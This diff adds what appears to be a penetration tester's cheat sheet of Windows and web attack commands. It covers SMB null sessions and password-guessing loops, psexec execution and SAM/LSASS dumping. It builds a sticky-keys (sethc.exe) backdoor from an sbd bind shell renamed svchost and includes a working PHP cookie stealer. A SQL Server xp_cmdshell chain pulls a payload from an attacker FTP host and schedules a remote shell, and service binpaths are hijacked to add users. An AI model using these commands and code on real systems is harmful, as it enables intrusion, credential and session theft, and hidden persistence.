@@ -1,0 +1,202 @@
+ Simple http get request... snooze.
+Lets get some basic headers using sbd.exe, nc, telnet whatever..
+
+telnet www.microsoft.com 80
+nc www.microsoft.com 80
+sbd -c off www.microsoft.com 80
+
+
+Enter default HTTP / GET|OPTIONS|PUT|POST|HEAD|TRACE Command
+(Using Host header is only important when there is vhosting on the IP/hostname)
+GET / HTTP /1.1
+Host: www.microsoft.com
+Press Enter twice
+
+
+(Windows telnet lameness.. Turning on local echo..)
+Type "Ctrl+]"
+Type "set localecho"
+Press Enter twice
+
+
+-------------------------
+
+NetBIOS Session Service TCP port 139
+
+Connect through null session:
+
+net use \\192.168.1.152\IPC$ “” /user:””
+net view \\192.168.1.152
+Use tools like enum, GetAcct and winfo to enumerate more info.
+
+Connect through valid user:
+Smbclient to enumerate more info.
+net use \\192.168.1.152\C$ * /user:scadmin (Will prompt for a password)
+net use \\192.168.1.152\C$ ronald3211 /user:scadmin
+at \\192.168.1.152 00:04 c:\Windows\system32\cmd.exe
+--------------------------------
+
+1. Create a file credentials.txt
+Password Username
+“” Administrator
+Password Administrator
+Admin Administrator
+
+2. FOR /F “tokens=1,2*” %i in (credentials.txt) do net use \\192.168.1.152\IPC$ %i /user:%j
+
+3. Using the NetBIOS tool with LOOP
+FOR /L %i IN (1,1,254) DO nat –u userlist.txt –p passlist.txt 192.168.1.%i > out.txt
+
+---------------------------
+
+
+Use psexec through port 139 or 445 to execute command
+Psexec \\192.168.1.152 –u Admin –p password –s cmd.exe
+
+
+Modify and accessing registry keys using
+Regdmp.exe
+Regini.exe
+Reg.exe
+
+Accessing the SAM Database and LSASS
+
+Pwdump5
+Lsadump2
+
+------------------------
+
+ sbd fun as a rookit via sethc.exe
+SBD Fun
+
+Transfering files
+RCV: sbd -l -p 4337 > outputfile
+XMIT: cat infile | sbd 127.0.0.1 4337 –q 10
+
+
+Transfering files through .tar.gz
+RCV: sbd -l -p 4337 | tar xvfpz –
+XMT: tar zcfp - /path/to/directory | sbd -w 3 127.0.0.1 4337
+
+
+PORT Scan:
+echo EXIT | sbd -v -w 1 127.0.0.1 20-250 500-600 5990-7000
+
+
+Using Cmd.exe to bind to service
+In my experience this is flaky at best..
+
+create then start service:
+sc create testsvc binpath= "cmd /K start" type= interact
+sc start testsvc
+
+
+Note that this time, the SC START immediately creates a new CMD window, even 
+if the original CMD window failed to start with error 1053 (this is expected since 
+CMD.EXE doesn’t have any service related code in it).
+
+SCM starts a service
+RegisterServiceCtrlHandler API
+
+We may want to fix any C program to actually handle the correct calls if loading them as a legitimate service.
+
+Simple C++ sbd wrapper
+(Rename sbdbg.exe to svchost in this example.)
+#include <cstdlib>
+#include <iostream>
+
+using namespace std;
+
+int main(int argc, char *argv[])
+{
+// Lets restrict address to localhost only.. pls.
+system("c:\\tmp\\svchost.exe -l -p 4337 -a 127.0.0.1 -e cmd.exe -r0");
+return EXIT_SUCCESS;
+}
+
+
+Rootkit portion
+Rename output binary to sethc.exe .. works ok.
+
+Prefetch restrictions.
+Remember to delete any exisiting sethc.exe files in c:\windows\prefetch prior to use.
+
+Interesting Note about RDC
+Sticky Keys [left-shift x5](sethc.exe) works through Remote Desktop Connections(RDC/RDP). Funny how suddenly that makes this all the more interesting.
+
+Apparently the SYSTEM Kernel security shuts down all unknown process on sweep @5 minutes into session.
+
+Can there fake handler for WM_CLOSE? or terminate... 
+
+----------------------------------
+PHP Cookie Stealer
+
+<?php
+$cookie = $_GET["c"];
+if ($cookie == "init")
+{$file = fopen('001.txt', 'w');
+fwrite($file, ":: 00* Logger:: \n");
+}
+else{
+$file = fopen('001.txt', 'a');
+fwrite($file, $_SERVER['REMOTE_ADDR']."=>".$cookie . "\n");
+}
+header("Content-type: image/png");
+$im = imageCreate(1,1);
+$background = imageColorAllocate($im, 255, 255, 255);
+imagePNG($im);
+imageDestroy($im);
+}
+?>
+----------------------------------
+
+
+reverse-shell from SQL server
+So you go the super secret sa password (or they left it blank~?)
+
+osql -Daaa -Usa -Psupersecret -Q "[valid sql statement]"
+
+{SQL template}
+osql -Daaa -Usa -Psupersecret -Q "exec xp_cmdshell '[valid shell commands]'"
+
+Pull data back to SQL:
+
+c:\windows\system32\tftp.exe
+c:\windows\system32\ftp.exe
+
+Or be obvious:
+net user add
+
+On semi-evil box hoster: (Serve TFTP or FTP)
+sbdbg.exe
+
+{SQL template} set up FTP command script:
+ECHO GET sbdbg > script.ftp
+ECHO QUIT >> script.ftp
+
+{SQL template} Execute FTP script:
+FTP -s:script.ftp -A semi.evil.host.ip
+
+{SQL template} setup reverse shell:
+echo sbdbg.exe -l -p 4337 -e cmd.exe > evil.bat
+
+{SQL template} get time on server:
+Dont forget ICMP timestamp requests instead..
+time
+
+{SQL template} schedule execution of bat file
+at \\sql.vuln.box\ 04:20 evil.bat
+
+connect from any.evil.ip
+sbd sql.vuln.box 4337
+
+-----------------------------
+
+sc qc upnphostsc config upnphost binpath= "net user <username> /add"
+sc config upnphost obj= ".\LocalSystem" password =""
+net stop upnphost
+net start upnphost
+
+create then start service:
+sc create testsvc binpath= "cmd /K start" type= interact
+sc start testsvc
